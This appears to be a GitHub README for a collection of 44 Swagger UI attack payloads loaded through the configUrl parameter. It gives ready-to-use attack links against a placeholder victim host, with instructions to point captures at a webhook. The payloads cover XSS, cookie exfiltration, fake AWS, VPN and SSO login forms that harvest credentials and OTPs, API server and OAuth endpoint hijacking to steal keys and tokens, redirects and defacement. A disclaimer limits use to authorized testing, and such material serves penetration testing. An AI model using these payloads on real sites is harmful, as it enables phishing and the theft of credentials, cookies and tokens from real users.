# Swagger UI Payload Collection

A collection of 44 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.

> **Authorized security testing only.** Use only on targets you have permission to test (bug bounty in-scope, VDP, pentest engagement). Report findings through responsible disclosure.

---

## How to use

Replace `VICTIM/swagger-ui.html` with your target's Swagger UI path. Every payload below has a ready-to-use attack link.

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/PAYLOAD.json
```

If the target URL already contains a `?` parameter, append with `&configUrl=` instead of `?configUrl=`.

**Before use:** replace `https://webhook.site/REPLACE-ME` inside the files with your own webhook URL (webhook.site / requestbin) to capture submitted credentials, cookies and beacon hits.

---

## 1. XSS Vectors (`xss-*.json`)

These payloads attempt JavaScript execution through different HTML vectors. Modern Swagger UI versions sanitize most of these (DOMPurify) — they are useful for fingerprinting and for older/unpatched versions.

| Payload | What it does |
|---|---|
| `xss-img-onerror` | XSS via `<img onerror>` — fires `alert(document.cookie)` on load if event handlers are not stripped |
| `xss-svg-animate` | XSS via SVG `<animate onbegin>` and `<set>` elements |
| `xss-svg-xlink` | XSS via SVG link `xlink:href="javascript:..."` — triggered on click |
| `xss-mutation-noscript` | Mutation XSS through `<noscript>` namespace confusion |
| `xss-mutation-mathml` | Mutation XSS through MathML `<mglyph>` (known DOMPurify bypass class) |
| `xss-mutation-style` | Mutation XSS through `<style>` element parsing |
| `xss-details-ontoggle` | Auto-firing XSS via `<details ontoggle>` — no user interaction needed |
| `xss-autofocus` | Auto-firing XSS via `autofocus + onfocus` — no click needed |
| `xss-marquee-media` | XSS via `<marquee onstart>` and video/audio error handlers |
| `xss-body-embed` | XSS via `<body onload>`, base64 `<embed>`, `<object>`, `<keygen>` |
| `xss-formaction` | XSS via `button formaction="javascript:..."` — triggered on submit |
| `xss-dompurify-probe` | Combined fingerprint probe — shows which vectors survive sanitization |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-img-onerror.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-animate.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-xlink.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-noscript.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-mathml.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-style.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-details-ontoggle.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-autofocus.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-marquee-media.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-body-embed.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-formaction.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-dompurify-probe.json
```

## 2. Cookie Capture (`cookie-*.json`)

Attempts to steal cookies through the Authorize button flow or through XSS vectors. The `authorizationUrl: javascript:` trick works on older Swagger UI versions.

| Payload | What it does |
|---|---|
| `cookie-authurl-domain` | The Authorize button executes `alert(document.domain)` — confirms JS execution path |
| `cookie-authurl-exfil` | Authorize button sends `document.cookie` to your webhook |
| `cookie-oauth-lure` | Fake OAuth scopes UI lures the user into Authorize, cookies sent to webhook |
| `cookie-img-onerror` | Image error handler sends `document.cookie` to webhook via `fetch` |
| `cookie-mutation-exfil` | MathML mutation XSS combined with cookie exfiltration |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-domain.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-exfil.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-oauth-lure.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-img-onerror.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-mutation-exfil.json
```

## 3. Phishing Login Pages (`login-*.json`)

Fake login forms rendered inside the real Swagger UI page. The form `action` points to your webhook — submitted credentials arrive there. These work on modern Swagger UI because DOMPurify allows `<form>`, `<input>` and `<button>`.

| Payload | What it looks like | What it captures |
|---|---|---|
| `login-basic` | "Login to Swagger" error page with login form | username + password |
| `login-sso-corporate` | Corporate SSO re-authentication screen | email + password |
| `login-mfa-otp` | Two-factor verification screen | 6-digit OTP code |
| `login-password-reset` | "Password expired" reset screen | old + new password |
| `login-api-key` | "API key expired" screen | API key + email |
| `login-aws-console` | AWS console sign-in look-alike | IAM credentials |
| `login-vpn-portal` | VPN gateway login | user + pass + OTP |
| `login-db-admin` | phpMyAdmin login | database credentials |
| `login-windows-popup` | Windows Security dialog look-alike | domain credentials |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-basic.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-sso-corporate.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-mfa-otp.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-password-reset.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-api-key.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-aws-console.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-vpn-portal.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-db-admin.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-windows-popup.json
```

## 4. Beacons / Delivery Confirmation (`img-*.json`)

Silent tracking payloads — they load invisible images from your webhook so you can confirm the payload was delivered and the page was opened. Use these first when testing blind targets.

| Payload | What it does |
|---|---|
| `img-beacon` | 1x1 pixel + markdown image beacon — confirms page load |
| `img-capture-multi` | Multiple beacons with markers — confirms render |
| `img-overlay` | Fullscreen image takeover — visible injection proof |
| `img-favicon-beacon` | Favicon + hidden image beacons |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-beacon.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-capture-multi.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-overlay.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-favicon-beacon.json
```

## 5. Server Hijack (`server-*.json`) — highest impact

Replaces the API server URL in the spec. When the user clicks **Try it out** and sends a request, the request (including API keys and auth headers) goes to your server. This works even when all XSS vectors are sanitized — the `servers` field is not sanitized.

| Payload | What it does |
|---|---|
| `server-hijack-single` | Only your server is listed — all Try-it-out requests go to your webhook |
| `server-hijack-multi` | Your server shown as "recommended", real one as "Legacy" |
| `server-hijack-path` | Subdomain-proxy style URL — visually looks legitimate |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-single.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-multi.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-path.json
```

## 6. OAuth Interception (`oauth-*.json`)

Sets the OAuth authorization/token endpoints to your webhook. When the user clicks **Authorize**, the authorization request or token goes to you.

| Payload | What it does |
|---|---|
| `oauth-redirect-capture` | Implicit flow — authorization request hits your webhook |
| `oauth-password-flow` | Password flow — token request hits your webhook |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-redirect-capture.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-password-flow.json
```

## 7. Redirects (`redirect-*.json`)

| Payload | What it does |
|---|---|
| `redirect-meta` | Meta refresh + JS fallback — auto redirect on load |
| `redirect-click` | Big "Continue to Dashboard" button — redirect on click |
| `redirect-window-open` | `window.open` / `top.location` link vectors |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-meta.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-click.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-window-open.json
```

## 8. HTML Injection / Defacement (`html-*.json`)

Visible content injection — proves the page content is attacker-controlled. Works on modern Swagger UI.

| Payload | What it does |
|---|---|
| `html-banner` | Fake "API deprecated" maintenance banner |
| `html-deface-overlay` | Fullscreen takeover text |
| `html-fake-error` | Fake fatal error message |
| `html-marquee` | Scrolling defacement banner |
| `html-table-spoof` | Fake "exported credentials" table — content spoof |
| `html-iframe-probe` | Tests if iframe/embed/object survive sanitization |

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-banner.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-deface-overlay.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-fake-error.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-marquee.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-table-spoof.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-iframe-probe.json
```

---

## Notes

- **Replace the webhook**: `https://webhook.site/REPLACE-ME` appears in payloads that capture data. Replace it with your own webhook URL, otherwise nothing will be captured.
- **Legacy vs modern**: `login-*`, `img-*`, `server-*`, `html-*` payloads work on current Swagger UI versions. `xss-*` and `cookie-*` payloads mostly fire only on older/unpatched versions.
- **Direct spec format**: you can also use `?url=` with the `.yaml` file instead of `?configUrl=` with the `.json` file — both are provided in this repo.

## Legal

This repository is for authorized security assessments only. Unauthorized testing of systems you do not own or have permission to test is illegal under the Information Technology Act 2000 (India), the Computer Fraud and Abuse Act (US), and similar laws worldwide. Always report findings through responsible disclosure.
